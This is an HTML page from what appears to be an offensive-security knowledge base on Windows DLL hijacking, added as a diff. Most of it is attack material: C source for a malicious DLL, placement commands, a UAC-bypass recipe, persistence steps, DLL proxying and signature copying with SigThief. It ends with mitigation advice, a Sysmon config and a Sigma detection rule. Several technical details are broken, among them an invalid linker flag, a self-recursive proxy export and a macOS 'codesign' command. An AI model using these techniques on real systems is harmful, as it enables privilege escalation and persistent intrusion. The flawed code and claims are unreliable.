@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DLL Hijacking | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Windows Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Windows Security</a> / DLL Hijacking
+    </div>
+    <div class="page-header">
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity | T1574.001</span>
+      <h1>📦 DLL Hijacking</h1>
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1574.001</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Execution, Persistence</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Medium</span></div>
+      </div>
+    </div>
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>DLL Hijacking exploits Windows DLL search order to execute malicious code by placing a crafted DLL in a location where a legitimate application will load it. This technique is used for execution, privilege escalation, and persistence.</p>
+      <div class="vulnerability-box">
+        <strong>Why DLL Hijacking Works:</strong>
+        <ul>
+          <li><strong>Unsafe Search Order:</strong> Programs search current directory before system paths</li>
+          <li><strong>Missing DLLs:</strong> Applications reference DLLs that don't exist</li>
+          <li><strong>Writable Directories:</strong> User-accessible directories in search path</li>
+          <li><strong>No Signature Validation:</strong> Many apps don't verify DLL authenticity</li>
+        </ul>
+      </div>
+      <p><strong>Windows DLL Search Order (SafeBoot excluded):</strong></p>
+      <ol>
+        <li>Application directory</li>
+        <li>System32 (or SysWOW64)</li>
+        <li>Windows directory</li>
+        <li>Current working directory</li>
+        <li>PATH environment directories</li>
+      </ol>
+    </div>
+    <div class="content-section" id="enumeration">
+      <h2>🔍 DLL Hijacking Discovery</h2>
+      <p><strong>Find Missing DLLs:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Use Procmon to find DLL load failures
+# Filter: Result = NAME NOT FOUND
+# Then find first instance of missing DLL per process
+
+# PowerShell - find executables with missing DLLs
+Get-ChildItem C:\Program Files -Recurse -Filter "*.exe" | ForEach-Object {
+    $exe = $_.FullName
+    try {
+        $deps = [System.Reflection.Assembly]::LoadFile($exe)
+    } catch {}
+}
+
+# Quick check with dumpbin (VS Tools)
+dumpbin /dependents application.exe
+
+# List DLLs loaded by application
+tasklist /m | findstr application.exe</pre>
+      </div>
+      <p><strong>Find Writable Directories:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check common directories for write access
+icacls "C:\Windows\System32"
+icacls "C:\Windows"
+icacls "C:\Program Files"
+icacls "C:\Program Files (x86)"
+
+# Check if PATH directories are writable
+$env:PATH -split ';' | ForEach-Object { 
+    if (Test-Path $_) { 
+        $acl = Get-Acl $_ 
+        $acl.Access | Where-Object { $_.IdentityReference -like "*Users*" -and $_.FileSystemRights -like "*Write*" } 
+    } 
+}
+
+# Use accesschk
+accesschk.exe -wqd "Users" C:\Windows\Temp</pre>
+      </div>
+      <p><strong>Automated Discovery (FinDLL, dll-hijack-detector):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using PowerSploit - Find-ProcessDLLHijack
+Import-Module .\Find-ProcessDLLHijack.ps1
+Find-ProcessDLLHijack -ProcessName notepad
+
+# Find all hijackable DLLs
+Get-ChildItem C:\Windows\System32 -Filter "*.exe" | Find-ProcessDLLHijack
+
+# Using Winpeas
+winpeas.exe quiet
+
+# Search for known vulnerable DLLs
+Get-ChildItem C:\Windows -Filter "*.dll" -Recurse | Select-Object Name</pre>
+      </div>
+    </div>
+    <div class="content-section" id="exploitation">
+      <h2>💣 Exploitation</h2>
+      <p><strong>1. Basic DLL Hijack (Write to Application Directory):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create malicious DLL
+# header file
+#include <windows.h>
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        WinExec("cmd.exe /c whoami > C:\\temp\\dll_hijack.txt", SW_HIDE);
+    }
+    return TRUE;
+}
+
+# Compile with MinGW
+x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c -lwinapi32</pre>
+      </div>
+      <p><strong>2. Masquerade as Missing DLL:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Identify missing DLL using Procmon or:
+# Run: procmon.exe /quiet /minimal /backingfile capture.pml
+# Then filter in UI or use: procmon.exe /terminate
+
+# Place DLL in application directory
+copy evil.dll "C:\Program Files\App\legit.dll"
+
+# When app runs, it loads your DLL</pre>
+      </div>
+      <p><strong>3. UAC Bypass via DLL Hijack:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find auto-elevated binary that loads DLL from writable path
+# Common targets: eventvwr.exe, mmc.exe, fodhelper.exe
+
+# Check if DLL search path is writable
+where eventvwr.exe
+icacls C:\Windows\System32\eventvwr.exe
+
+# If Binary triggers MMC which loads something from CWD
+# Create your DLL in a folder you control
+
+# Example: write to fodhelper path if writable
+copy evil.dll C:\Windows\System32\fodhelper.exe.local\</pre>
+      </div>
+      <p><strong>4. Persistence via DLL Search Order Hijack:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Identify app that runs at startup and loads missing DLL
+# Place malicious DLL in that app's directory
+
+# Registry run key
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+# Or scheduled task that runs app
+schtasks /create /tn "TaskName" /tr "C:\Program Files\App\app.exe" /sc daily</pre>
+      </div>
+    </div>
+    <div class="content-section" id="advanced">
+      <h2>🔐 Advanced DLL Techniques</h2>
+      <p><strong>1. DLL Proxying (Forward Exports):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Use DLL Export Viewer to get original exports
+# Then create proxy DLL that forwards to original
+
+// Proxy DLL
+#include <windows.h>
+#pragma comment(lib, "OriginalDLL.lib")
+
+extern "C" {
+    __declspec(dllexport) void OriginalFunction() {
+        // Your code here
+        WinExec("calc.exe", SW_SHOW);
+        // Call original
+        OriginalFunction();
+    }
+}
+
+# Compile and replace original DLL (or use DLL search order)</pre>
+      </div>
+      <p><strong>2. Phantom DLL Hijacking:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create DLL with same name as missing DLL
+# Place in application directory
+
+# Check if app uses LoadLibrary (which doesn't search CWD)
+# Need to place in SafeDllSearchMode path
+
+# Or exploit when app calls SetDllDirectory("")
+# This removes SafeDllSearchMode and uses current directory first</pre>
+      </div>
+      <p><strong>3. DLL Sideloading (Side Loading):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find legitimate DLL that's loaded from writable location
+# Place your DLL there with same name
+
+# Use SigThief to copy signature from legitimate DLL
+python3 SigThief.py -i legitimate.dll -o malicious.dll
+
+# Then sign with codesign
+codesign -sign malicious.dll</pre>
+      </div>
+    </div>
+    <div class="content-section" id="persistence">
+      <h2>🎯 Persistence via DLL Hijack</h2>
+      <p><strong>Scheduled Task Hijack:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find scheduled task that runs executable
+schtasks /query /fo LIST /v | findstr /i "TaskName\|Program"
+
+# Check if executable's directory is writable
+icacls "C:\Scheduled App Path"
+
+# Place malicious DLL in that directory</pre>
+      </div>
+      <p><strong>Service Binary Path Hijack:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find service with writable path
+Get-WmiObject win32_service | Select Name, PathName, StartMode
+
+# If C:\Program Files\App\service.exe uses C:\Windows\Temp\app.dll
+# And C:\Windows\Temp is writable, place DLL there</pre>
+      </div>
+    </div>
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Primary Controls:</strong>
+        <ul>
+          <li><strong>Secure DLL Search:</strong> Use SafeDllSearchMode registry setting</li>
+          <li><strong>Remove Writable PATH:</strong> Eliminate user-writable directories from PATH</li>
+          <li><strong>Code Integrity:</strong> Enable Windows Defender Application Control (WDAC)</li>
+          <li><strong>Disable SetDllDirectory:</strong> Prevent removing SafeDllSearchMode</li>
+          <li><strong>Load DLLs with Full Path:</strong> Application development best practice</li>
+        </ul>
+      </div>
+      <p><strong>Enable Safe DLL Search Mode:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Registry setting
+REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode /t REG_DWORD /d 1 /f
+
+# Value 1 = search system directory first
+# Value 0 = search current directory first (vulnerable)</pre>
+      </div>
+    </div>
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+      <p><strong>Sysmon DLL Load Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Sysmon Event ID 7 - DLL Loaded
+# Monitor for:
+# - DLL loaded from unexpected locations (temp, user directories)
+# - DLL loaded with no signature
+# - DLL with suspicious imports (WinExec, CreateRemoteThread)
+
+<Sysmon schemaversion="4.90">
+  <EventFiltering>
+    <RuleGroup name="DLL Hijacking Detection" onmatch="include">
+      <ImageLoad condition="contains">Temp</ImageLoad>
+      <ImageLoad condition="contains">Users</ImageLoad>
+      <Signature condition="contains">Invalid</Signature>
+    </RuleGroup>
+  </EventFiltering>
+</Sysmon></pre>
+      </div>
+      <p><strong>Sigma Rule for DLL Search Order Hijacking:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>title: DLL Search Order Hijacking
+id: dll-hijack
+detection:
+  selection:
+    EventID: 7
+    ImageLoaded|contains:
+      - 'C:\Users'
+      - 'C:\Temp'
+      - 'C:\Windows\Temp'
+  condition: selection
+level: high</pre>
+      </div>
+    </div>
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+      <ul>
+        <li><strong>Procmon:</strong> Monitor DLL loads in real-time</li>
+        <li><strong>Winpeas:</strong> Find writable directories and DLL vulnerabilities</li>
+        <li><strong>DLL Export Viewer:</strong> View DLL exports for proxying</li>
+        <li><strong>SigThief:</strong> Copy digital signatures</li>
+        <li><strong>PowerSploit Find-ProcessDLLHijack:</strong> Automated discovery</li>
+        <li><strong>accesschk:</strong> Check directory permissions</li>
+      </ul>
+    </div>
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order" target="_blank">DLL Search Order</a></li>
+        <li><a href="https://oddvar.me/2018/01/08/hunting-for-dll-hijacking-vulnerabilities/" target="_blank">DLL Hijack Hunting</a></li>
+        <li><a href="https://github.com/api0cradle/LOLBAS" target="_blank">LOLBAS Project</a></li>
+        <li><a href="https://github.com/wietze/windows-dll-hijacking" target="_blank">DLL Hijack Examples</a></li>
+      </ul>
+    </div>
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Windows Security</a>
+  </div>
+</main>
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); text.textContent = 'Light'; }
+      else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); text.textContent = 'Dark'; }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  if (localStorage.getItem('theme-preference') === 'light') document.body.classList.add('light');
+});
+function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.textContent = 'Copied!'; setTimeout(() => { btn.textContent = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
